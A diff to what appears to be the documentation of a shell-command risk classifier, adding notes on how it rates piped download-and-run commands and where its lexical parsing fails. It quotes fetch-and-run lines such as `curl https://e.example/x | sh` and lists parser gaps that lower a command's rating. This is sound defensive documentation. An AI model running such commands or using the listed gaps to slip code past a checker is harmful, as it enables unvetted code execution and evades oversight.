@@ -1376,7 +1376,16 @@ A way around a limit that its entry does not describe is worth a
   counts. That script is found only when `c` ends its option word and the script is
   the next word, and it is read as one command, so `bash -ce 'sh a'`,
   `bash -c -- 'sh a'`, `sh -c 'cat a | sh'` and a command line given to `env -S`
-  (`env -S 'sh a'`) are medium. A download unpacked and then run, as by
+  (`env -S 'sh a'`) are medium; for the same reason
+  `bash -c 'curl https://e.example/x | sh'` is high, not critical. Groups and
+  compound commands are found lexically, outside any quote-aware parse: the pipe is
+  passed into `{ ... }`, `( ... )` and `if`, `while`, `until`, `for` and `select`
+  bodies when the group opens a command after a pipe, but a `)` inside quotes can
+  end a `( ... )` group early (`curl x | ( echo ")"; sh )`), and a `case` body is not
+  split at its patterns (`curl x | case x in x) sh;; esac`). A descriptor that holds
+  the pipe through `N>&0`, or one named by a variable (`<&$fd`), is not followed, and
+  `eval $(cat -)` unquoted is split as two words, so those forms stay high. A download
+  unpacked and then run, as by
   `curl x | tar -xz; sh install.sh`, is medium, because the archive's members are not
   known. A file a downloader's `-o`
   wrote counts as run when it is any argument of a shell, `python` or `perl`, as it did
